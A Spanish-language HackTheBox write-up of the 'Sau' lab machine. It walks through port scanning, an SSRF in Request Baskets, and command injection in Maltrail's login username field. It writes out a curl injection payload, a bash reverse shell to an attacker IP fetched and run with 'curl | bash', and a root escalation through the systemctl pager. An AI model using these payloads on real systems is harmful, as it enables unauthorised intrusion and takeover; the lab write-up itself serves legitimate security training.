@@ -1,0 +1,149 @@
+---
+title: "Sau"
+date: 2025-05-29 16:41:45 +0200
+categories: writeups HackTheBox
+tags: maltrail rce ssrf request commandinjection máquina systemctl linux
+description: Writeup de la máquina Sau de Hackthebox.
+image: ../assets/images/posts/logos/hackthebox.png
+---
+## Reconocimiento
+
+En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:
+
+```bash
+openvpn lab_trr0r.opvn
+```
+
+Después le lanzaremos un **ping** para ver si se encuentra activa dicha máquina, además de ver si acepta la traza **ICM**. Comprobamos que efectivamente nos devuelve el paquete que le enviamos por lo que acepta la traza **ICMP**, gracias al **ttl** podremos saber si se trata de una máquina **Linux (TTL 64 )** y **Windows (TTL 128)**, y vemos que se trata de una máquina **Linux** pues cuenta con **TTL** próximo a 64 (**63**), además gracias al script ****whichSystem.py**** podremos conocer dicha información.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102171452.png>)
+
+> El motivo por el cual el **TTL** es de **63** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.11.224`.
+### Nmap
+
+En segundo lugar, realizaremos un escaneo usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.
+
+```bash
+nmap -p- --open --min-rate 5000 -sS -v -Pn -n 10.10.11.224 -oG allPorts
+```
+
+Observamos como nos reporta que se encuentran abiertos los puertos **22 y 55555**.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102171733.png>)
+
+Ahora, gracias a la utilidad **getPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.
+
+A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.
+
+```bash
+nmap -p22,55555 -sCV 10.10.11.224 -oN targeted
+```
+
+Lo más interesante que podemos encontrar en la captura de **Nmap** es que en el puerto **5555** está alojado un servidor web.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102171830.png>)
+___
+## Explotación
+
+En aspecto de la página web es el siguiente y veremos que se está produciendo un **Information Leakage** del servicio web que está alojado en dicha página web:
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102171942.png>)
+
+Observamos que al buscar por internet algún exploit correspondiente a **request basekst** en la versión **1.2.1** veremos que existe un **SSRF**.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102172038.png>)
+### SSRF
+
+Existen dos formas de explotar esta vulnerabilidad, de forma manual, es decir entendiendo lo que ocurre o de manera automatizada a través de un exploit.
+#### Manual Way
+
+En primer lugar veremos la forma manual para ello en primer lugar debemos de crear un **basket**:
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102172757.png>)
+
+A continuación accederemos a dicho **basket** a través de **/web/test** y veremos que al realizar una petición a dicho **basket** (`http://10.10.11.224:55555/test`) se ve reflejada en la página web al igual que si accedemos a través del navegador también nos aparece.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102172920.png>)
+
+En la ruedita podemos tocar configuraciones de nuestro **basket** (**test**) como por ejemplo indicar la **URL** a la que nos reenvía cuando accedemos a nuestro **basket**. Por lo que probaremos a poner nuestra dirección **URL**, marcaremos la opción de **Proxy Response** y le daremos a **Apply** para comprobar si somos reenviados a nuestro **index.html** en nuestro servidor web.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102174328.png>)
+
+Nos crearemos un archivo **index.html** con el contenido que queramos, nos montaremos un servidor con python (`python -m http.server 80`) y observaremos que al acceder a nuestro **basket** (**test**) nos reenvía al **index.html** de nuestro servidor web montado con python.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102173258.png>)
+
+En este punto lo que se nos debe de ocurrir es apuntar a una dirección **URL** interna de la máquina víctima que tan solo sea accesible desde la misma máquina, es decir intentar acontecer un **SSRF**. En definitiva, lo que debemos de hacer es indicar la dirección **URL** del **localhost**, marcar las opciones **Proxy Response** y **Expand Forward Path** y darle a **Apply**.
+
+> *Destacar que de primeras no sabremos que opciones marcar por lo que hemos de ir jugando con las opciones hasta que nos funcione.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102174549.png>)
+
+Observamos que al acceder a nuestro **basket** (**test**), es decir a la **URL** **/web/test** veremos que en ella se encuentra un servicio interno, en concreto se trata de **Maltrail**.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102173350.png>)
+#### Automated Way
+
+La forma automatizada es mucho más sencilla ya que lo que nosotros hemos realizamos de manera manual el exploit nos automatiza dicho proceso.
+
+En primer lugar, nos descargaremos el exploit (`wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/refs/heads/main/CVE-2023-27163.sh`) perteneciente al [Repositorio Github - CVE-2023-27163 de  entr0pie](https://github.com/entr0pie/CVE-2023-27163).
+
+Una vez descargado procederemos a ejecutarlo de la siguiente forma, pasándole en primer lugar la **URL** donde se encuentra el **request baskets** y en segundo lugar donde la dirección **URL** a donde queremos llegar a través **SSRF**.
+
+```bash
+./CVE-2023-27163.sh http://10.10.11.224:55555/ http://localhost
+```
+
+Observamos como el exploit nos devuelve la **URL** a partir de la cual podemos acceder al **basket** donde supuestamente se está apuntando a una dirección **URL** interna gracias al **SSRF**.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102175713.png>)
+
+Observamos que al acceder al **basket** creado por el exploit, accederemos de igual forma al servicio interno que corre por el puerto **80**, es decir al **Maltrail**.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102175800.png>)
+### Maltrail
+
+Buscaremos en internet por algún exploit relacionado con **Maltrail** en la versión **0.53** y veremos que existe un **RCE** a través de una **Command Injection**.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102175302.png>)
+
+Nos descargaremos un exploit (`wget https://raw.githubusercontent.com/spookier/Maltrail-v0.53-Exploit/refs/heads/main/exploit.py`) y veremos que en lo que se basa esta vulnerabilidad es colar un comando gracias a la c**omilla invertida** (**\`**).
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102175500.png>)
+
+Como es tan sencilla la manera de colar un comando intentaremos replicarla usando **curl** de la siguiente forma:
+
+```bash
+curl http://10.10.11.224:55555/test/login --data-urlencode 'username=;`ping -c 1 10.10.14.10`'
+```
+
+Como no podemos ver el output del comando nos pondremos en escucha por trazas **ICMP** (`tcpdump -i tun0 icmp -n`) y veremos como recibimos un **ping** desde la **Dirección IP** de la máquina víctima.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102181428.png>) 
+
+Al ver que podemos podemos ejecutar comandos remotamente (**RCE**) nos intentaremos enviar una **Reverse Shell**.
+
+En primer lugar nos pondremos en escucha con **NetCat** (`nc -nvlp 443`), luego nos montaremos un servidor con python (`python -m http.server`) el cual tendrá un **index.html** con el típico one liner de bash (`bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"`) y posteriormente desde la máquina víctima accederemos a dicho **index.html** el cual lo interpretaremos con **bash** (`curl http://10.10.14.10 | bash`). 
+
+Finalmente, veremos como conseguimos acceder correctamente a la máquina víctima. 
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102184156.png>)
+
+___
+## Escalada de privilegios 
+
+En primer lugar realizaremos un **Tratamiento de la TTY** para poder operar desde una terminal más cómoda.
+
+Una vez realizado el **Tratamiento de la TTY** realizaremos las comprobaciones previas de siempre, es decir **Sudoers**, **SUID**,... y nos daremos cuenta que tenemos un permiso de **Sudoers** con el cual podemos ejecutar `/usr/bin/systemctl status trail.service` como **cualquier usuario** sin proporcionar **contraseña**.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102182509.png>)
+
+Lo primero que se nos debe de venir a la mente es que el comando `/usr/bin/systemctl` tiene un modo **paginado** (presente en otros comandos como `less` o `more`) al **status** de un servicio, pero tal y como vemos en la captura de pantalla no nos aparece el modo **paginado**.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102183128.png>)
+
+Tras estar un rato probando se me ocurre una forma de forzar el modo **paginado**, para ello debemos de reducir el tamaño de la **TTY** a `stty rows 10 cols 184` y veremos que al ejecutar de nuevo el comando sobre el cual tenemos permiso de **Sudoers**, es decir `sudo -u root /usr/bin/systemctl status trail.service` entraremos en modo el **paginado** en el que coloraremos una `!/bin/bash`.
+
+Observamos como finalmente hemos conseguido convertimos en el usuario **root** gracias al permiso de **Sudoers** sobre `/usr/bin/systemctl`.
+
+![](<../assets/images/posts/2025-05-29-sau/Pasted image 20250102183629.png>)
